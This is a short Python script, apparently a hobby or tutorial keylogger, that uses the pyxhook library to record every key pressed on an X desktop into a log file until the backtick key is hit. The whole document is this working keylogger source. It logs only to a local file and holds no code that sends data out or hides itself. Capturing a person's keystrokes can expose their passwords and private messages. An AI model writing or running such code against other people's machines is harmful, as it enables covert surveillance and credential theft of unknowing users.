import pyxhook

# This tells the keylogger where the log file will go (where characters are logged). Change it as is needed.
# Change `your_username` to your account name.
log_file = '/home/your_username/Desktop/file.log'


def OnKeyPress(event):
    fob = open(log_file, 'a')
    fob.write(event.Key)
    fob.write('\n')
    if event.Ascii == 96:
        fob.close()
        new_hook.cancel()

new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
new_hook.HookKeyboard()
new_hook.start()
